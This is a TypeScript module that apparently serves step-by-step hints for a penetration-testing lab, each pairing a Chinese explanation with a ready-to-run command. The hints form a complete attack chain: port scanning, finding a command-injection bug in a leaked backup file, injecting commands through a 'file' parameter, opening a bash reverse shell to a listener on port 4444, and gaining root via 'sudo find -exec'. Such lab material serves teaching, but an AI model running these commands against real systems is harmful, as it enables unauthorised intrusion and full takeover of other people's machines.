export interface SecurityHint {
  explanation: string;
  command: string;
}

export const SECURITY_HINT_LIMIT = 10;

const HINTS: Array<(targetIp: string) => SecurityHint> = [
  (targetIp) => ({
    explanation: '扫描开放端口',
    command: `nmap -sT -sV ${targetIp}`,
  }),
  (targetIp) => ({
    explanation: '查看网站源码线索',
    command: `curl http://${targetIp}:8000/`,
  }),
  (targetIp) => ({
    explanation: '读取 robots 线索',
    command: `curl http://${targetIp}:8000/robots.txt`,
  }),
  (targetIp) => ({
    explanation: '查看调试接口提示',
    command: `curl http://${targetIp}:8000/debug`,
  }),
  (targetIp) => ({
    explanation: '定位注入代码',
    command: `curl -s http://${targetIp}:8000/backup/app.py.bak | grep -nE 'file_name|cmd =|shell=True'`,
  }),
  (targetIp) => ({
    explanation: '测试命令注入',
    command: `curl --get --data-urlencode "file=-version >/dev/null 2>&1;id;true" "http://${targetIp}:8080/api/convert"`,
  }),
  (targetIp) => ({
    explanation: '启动监听并获取 Shell',
    command: `ATTACKER_IP=$(hostname -I | awk '{print $1}'); (sleep 1; curl --get --data-urlencode "file=-version >/dev/null 2>&1;nohup bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1' >/tmp/rev.log 2>&1 & true" "http://${targetIp}:8080/api/convert") & nc -lvnp 4444`,
  }),
  () => ({
    explanation: '检查 sudo 提权权限',
    command: 'sudo -l',
  }),
  () => ({
    explanation: '利用 find 提权',
    command: 'sudo find . -exec /bin/bash -p -i \\; -quit',
  }),
  () => ({
    explanation: '确认 root 身份',
    command: 'id',
  }),
];

export function getSecurityHint(index: number, targetIp: string): SecurityHint | null {
  const factory = HINTS[index];
  return factory ? factory(targetIp) : null;
}

export function getSecurityHintCount(): number {
  return Math.min(HINTS.length, SECURITY_HINT_LIMIT);
}
